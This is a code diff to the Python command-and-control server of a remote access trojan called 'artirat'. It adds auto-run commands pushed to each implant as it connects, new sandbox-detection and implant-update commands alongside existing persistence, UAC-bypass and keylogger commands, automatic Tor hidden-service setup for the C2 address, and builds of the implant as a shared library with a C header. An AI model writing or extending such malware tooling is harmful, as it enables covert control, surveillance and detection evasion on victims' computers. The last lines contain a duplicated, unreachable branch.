@@ -29,6 +29,7 @@ HOSTNAME_PATH = os.path.join(SERVER_CONFIG_DIR, "hostname")
 CLIENT_HOSTNAME_PATH = os.path.join(CLIENT_CONFIG_DIR, "hostname")
 STREAM_CONFIG_PATH = os.path.join(BASE_DIR, "stream_config.txt")
 TORRC_PATH = os.path.join(BASE_DIR, "torrc")
+AUTORUN_PATH = os.path.join(BASE_DIR, ".autorun_commands")
 SYSTEM_TORRC_CANDIDATES = [
     "/data/data/com.termux/files/usr/etc/tor/torrc",
     "/etc/tor/torrc",
@@ -71,6 +72,19 @@ class ClientManager:
         self.client_hostnames: dict[int, str] = {}
         self.client_dirs: dict[int, str] = {}
         self.screenshot_counter: dict[int, int] = {}
+        self.autorun_cmds = self._load_autorun()
+
+    def _load_autorun(self):
+        try:
+            with open(AUTORUN_PATH) as f:
+                return f.read().strip()
+        except FileNotFoundError:
+            return ""
+
+    def save_autorun(self, cmds: str):
+        self.autorun_cmds = cmds
+        with open(AUTORUN_PATH, "w") as f:
+            f.write(cmds + "\n")
 
     def add(self, conn, addr) -> int:
         with self.lock:
@@ -78,7 +92,32 @@ class ClientManager:
             self.next_id += 1
             self.clients[cid] = (conn, addr)
             print(f"\n[Client {cid} connected from {addr}]")
-            return cid
+        if self.autorun_cmds:
+            threading.Thread(target=self._run_autorun, args=(cid,), daemon=True).start()
+        return cid
+
+    def _run_autorun(self, cid: int):
+        with self.lock:
+            client = self.clients.get(cid)
+            if not client:
+                return
+            conn, addr = client
+        for raw in self.autorun_cmds.split(";"):
+            cmd = raw.strip()
+            if not cmd:
+                continue
+            try:
+                conn.sendall((cmd + "\n").encode())
+                conn.settimeout(15)
+                resp = recv_until_prompt(conn)
+                if resp:
+                    out = resp.decode(errors="ignore")
+                    for line in out.split("\n"):
+                        _stream_msg(f"[autorun:{cid}] {line.rstrip()}")
+            except Exception:
+                break
+            finally:
+                conn.settimeout(None)
 
     def remove(self, cid):
         with self.lock:
@@ -197,11 +236,13 @@ CLIENT_COMMANDS = [
     "persist",
     "check_elevated",
     "self_uac",
+    "sandbox_detect",
     "portscan",
     "keylogger_start",
     "keylogger_stop",
     "exit", "quit",
     "background",
+    "update_implant",
 ]
 
 SHELL_COMMANDS = [
@@ -583,6 +624,11 @@ def _dist_binaries(target_triple: str):
         if name in keep_basenames and ext in keep_exts and os.path.isfile(item_path):
             shutil.copy2(item_path, os.path.join(dist_dir, item))
             print(f"  -> dist/{target_triple}/{item}")
+    # Copy C header if generated
+    h_path = os.path.join(".", "artirat-client", "artirat_client.h")
+    if os.path.exists(h_path):
+        shutil.copy2(h_path, os.path.join(dist_dir, "artirat_client.h"))
+        print(f"  -> dist/{target_triple}/artirat_client.h")
     shutil.rmtree(os.path.join(".", "artirat-client", "target"))
 
 
@@ -606,6 +652,18 @@ def build_client(target: str, verbose=False, static=False, upx=False):
     kind = "SHELLCODE" if is_shellcode else ("DLL/SO" if is_dll else "EXE")
     result = subprocess.run(["rustup", "target", "list", "--installed"], capture_output=True, text=True)
     installed = set(result.stdout.strip().split()) if result.returncode == 0 else set()
+
+    host_result = subprocess.run(["rustc", "-vV"], capture_output=True, text=True)
+    host_target = None
+    for line in host_result.stdout.split("\n"):
+        if line.startswith("host:"):
+            host_target = line.split(":", 1)[1].strip()
+            break
+    if host_target and host_target not in installed:
+        print(f"[*] Installing host target {host_target}...")
+        subprocess.run(["rustup", "target", "add", host_target], capture_output=True, text=True)
+        installed.add(host_target)
+
     if t not in installed:
         print(f"[*] Installing rust target {t}...")
         inst = subprocess.run(["rustup", "target", "add", t], capture_output=True, text=True)
@@ -683,6 +741,50 @@ def build_client(target: str, verbose=False, static=False, upx=False):
                     print(f"[-] UPX failed: {result.stderr.strip()}")
             else:
                 print(f"[-] UPX: binary not found at {bin_path}")
+
+        # Also build shared library version (DLL/SO) for non-dll, non-shellcode targets
+        if not is_dll:
+            print(f"[*] Building shared library for {t}...")
+            shared_env = env.copy()
+            shared_rustflags = shared_env.get("RUSTFLAGS", "")
+            shared_rustflags = f"{shared_rustflags} --remap-path-prefix={abs_project_dir}=src --remap-path-prefix={home_dir}=~".strip()
+            if shared_rustflags:
+                shared_env["RUSTFLAGS"] = shared_rustflags
+            shared_cmd = ["cargo", "build", "--release", "--lib", "--features", "shared-lib", "--target", t]
+            shared_rc = _stream_cargo(shared_cmd, os.path.join(".", "artirat-client"), shared_env, verbose)
+            if shared_rc == 0:
+                print(f"[+] Shared library build succeeded for {t}")
+            else:
+                print(f"[-] Shared library build failed for {t} (exit code {shared_rc})")
+
+        # Generate C header with cbindgen
+        print(f"[*] Generating C header with cbindgen...")
+        cbindgen_code = subprocess.run(
+            ["cargo", "install", "cbindgen", "--force"],
+            capture_output=True, text=True
+        )
+        if cbindgen_code.returncode == 0 or "already installed" in cbindgen_code.stderr.lower():
+            header_result = subprocess.run(
+                ["cbindgen", "--crate", "artirat_client",
+                 "--config", os.path.join(".", "artirat-client", "cbindgen.toml"),
+                 "--output", os.path.join(".", "artirat-client", "artirat_client.h")],
+                capture_output=True, text=True, cwd=os.path.join(".", "artirat-client")
+            )
+            if header_result.returncode == 0:
+                print(f"[+] C header generated: artirat_client.h")
+            else:
+                # Try without config
+                header_result = subprocess.run(
+                    ["cbindgen", "--crate", "artirat_client",
+                     "--output", os.path.join(".", "artirat-client", "artirat_client.h")],
+                    capture_output=True, text=True, cwd=os.path.join(".", "artirat-client")
+                )
+                if header_result.returncode == 0:
+                    print(f"[+] C header generated: artirat_client.h")
+                else:
+                    print(f"[-] cbindgen failed: {header_result.stderr.strip()}")
+        else:
+            print(f"[-] cbindgen installation failed: {cbindgen_code.stderr.strip()}")
     _dist_binaries(t)
     return True
 
@@ -701,7 +803,7 @@ def setup_readline(completer):
 def c2_completer(text, state, manager=None):
     if manager is None:
         return None
-    CMD2 = {"select", "build", "configure_tor"}
+    CMD2 = {"select", "build", "configure_tor", "autorun_commands"}
     CMD1 = {"list", "exit", "hide_stream", "show_stream", "write_config"}
     ALL_CMDS = CMD1 | CMD2 | {"multi_run"}
     line = readline.get_line_buffer()
@@ -823,6 +925,13 @@ def c2_menu(manager: ClientManager):
         elif cmd == "configure_tor":
             port = int(parts[1]) if len(parts) > 1 else 1337
             configure_tor(port)
+        elif cmd == "autorun_commands":
+            if len(parts) < 2:
+                print(f"Current autorun commands: {manager.autorun_cmds or '(none)'}")
+                print("Usage: autorun_commands <semicolon-separated commands>")
+                continue
+            manager.save_autorun(line[len(cmd):].strip())
+            print(f"[+] Autorun commands set to: {manager.autorun_cmds}")
         elif cmd == "multi_run":
             if len(parts) < 2:
                 print("Usage: multi_run <command>")
@@ -831,7 +940,7 @@ def c2_menu(manager: ClientManager):
         elif cmd == "exit":
             break
         else:
-            print("Commands: list, select <id>, multi_run <cmd>, build <target>, write_config, configure_tor [port], exit")
+            print("Commands: list, select <id>, multi_run <cmd>, build <target>, write_config, configure_tor [port], autorun_commands, exit")
 
 
 def find_system_torrc():
@@ -889,6 +998,7 @@ def write_config():
         hostname = get_hostname_from_dir(hs_dir)
         if hostname:
             lines.append(f"{hostname}:{port}")
+    # Ephemeral hidden service via Tor controller
     try:
         from stem.control import Controller
         controller = Controller.from_port(port=9051)
@@ -899,13 +1009,22 @@ def write_config():
             pairs = dict(line.split("=", 1) for line in resp if "=" in line)
             service_id = pairs.get("ServiceID", "")
             onion = f"{service_id}.onion:1337"
-            lines.append(onion)
-            print(f"[+] Ephemeral hidden service: {onion}")
+            if onion not in lines:
+                lines.append(onion)
+                print(f"[+] Ephemeral hidden service: {onion}")
         else:
             print(f"[-] ADD_ONION failed: {resp}")
         controller.close()
     except Exception as e:
         print(f"[-] Could not create ephemeral hidden service via stem: {e}")
+
+    # Persistent hidden service hostname from disk (if available)
+    hs_hostname = get_hostname_from_dir(os.path.join(SERVER_CONFIG_DIR, "hidden_service"))
+    if hs_hostname:
+        entry = f"{hs_hostname}:1337"
+        if entry not in lines:
+            lines.append(entry)
+            print(f"[+] Using persistent hidden service: {hs_hostname}")
 
     if lines:
         os.makedirs(CLIENT_CONFIG_DIR, exist_ok=True)
@@ -985,23 +1104,74 @@ def run_c2_server():
     manager = ClientManager()
     threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
     time.sleep(0.3)
+
+    threading.Thread(target=_auto_setup_hidden_service, daemon=True).start()
+
     print()
     c2_menu(manager)
 
 
+def _auto_setup_hidden_service():
+    try:
+        print("[*] Connecting to Tor for persistent hidden service setup...")
+        controller = connect_tor()
+        try:
+            hostname = create_hidden_service(controller)
+        finally:
+            controller.close()
+        print(f"[+] Persistent hidden service: {hostname}")
+
+        services = parse_torrc()
+        lines = []
+        for hs_dir, port, target in services:
+            if "artirat" not in hs_dir.lower():
+                continue
+            h = get_hostname_from_dir(hs_dir)
+            if h:
+                lines.append(f"{h}:{port}")
+        lines.append(f"{hostname}:1337")
+        os.makedirs(CLIENT_CONFIG_DIR, exist_ok=True)
+        with open(CLIENT_HOSTNAME_PATH, "w") as f:
+            f.write("\n".join(lines) + "\n")
+        print(f"[+] Wrote {len(lines)} hostname(s) to {CLIENT_HOSTNAME_PATH}")
+    except Exception as e:
+        print(f"[-] Persistent hidden service setup skipped (non-fatal): {e}")
+
+
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="artirat C2 server and build tool")
-    parser.add_argument("-x", "--execute", nargs='+', help="Execute a command non-interactively (e.g. 'build linux --static')")
+    parser = argparse.ArgumentParser(
+        description="artirat C2 server and build tool",
+        epilog="Use -x/--execute <command> to run a command non-interactively. "
+               "Multiple commands can be separated by semicolons. "
+               "Examples: -x 'build linux --verbose', -x 'write_config; build all'"
+    )
     parser.add_argument("-w", "--write-hostname", action="store_true", help="Parse torrc and write hostname:port to client config")
-    args = parser.parse_args()
+    parser.add_argument("-i", "--interactive", action="store_true", help="Drop into the interactive C2 shell after executing -x commands")
+    parser.add_argument("-a", "--autorun-commands", help="Comma-separated list of commands to autorun on each client connection")
+    args, extra = parser.parse_known_args()
+
+    execute_str = None
+    for i, arg in enumerate(extra):
+        if arg in ("-x", "--execute"):
+            execute_str = " ".join(extra[i+1:])
+            break
 
     if args.write_hostname:
         write_config()
-        sys.exit(0)
+        if not args.interactive:
+            sys.exit(0)
 
-    if args.execute:
-        cmdline = " ".join(args.execute)
-        commands = cmdline.split(";")
+    manager = None
+    if execute_str or args.interactive:
+        _load_stream_config()
+        manager = ClientManager()
+        threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
+        time.sleep(0.3)
+        if args.autorun_commands:
+            manager.save_autorun(args.autorun_commands.replace(",", ";"))
+
+    if execute_str:
+        commands = execute_str.split(";")
         for raw in commands:
             raw = raw.strip()
             if not raw:
@@ -1016,7 +1186,9 @@ if __name__ == "__main__":
                     print("Usage: build <target> [--verbose] [--static] [--upx]")
                     print("       build all [--verbose] [--static] [--upx]")
                     print(f"Targets: {', '.join(ALL_BUILD_TARGETS)}")
-                    sys.exit(1)
+                    if not args.interactive:
+                        sys.exit(1)
+                    continue
                 target_arg = parts[1]
                 if target_arg == "all":
                     targets = EXE_BUILD_TARGETS
@@ -1027,7 +1199,7 @@ if __name__ == "__main__":
                     print("[+] All builds finished")
                 else:
                     ok = build_client(target_arg, verbose=verbose, static=static, upx=upx)
-                    if not ok:
+                    if not ok and not args.interactive:
                         sys.exit(1)
             elif cmd == "write_config":
                 write_config()
@@ -1037,6 +1209,13 @@ if __name__ == "__main__":
             else:
                 print(f"[-] Unknown command: {cmd}")
                 print("    Commands: build, write_config, configure_tor")
-                sys.exit(1)
-    else:
+                if not args.interactive:
+                    sys.exit(1)
+
+    if args.interactive and manager:
+        print()
+        c2_menu(manager)
+    elif not execute_str:
+        run_c2_server()
+    elif not execute_str:
         run_c2_server()
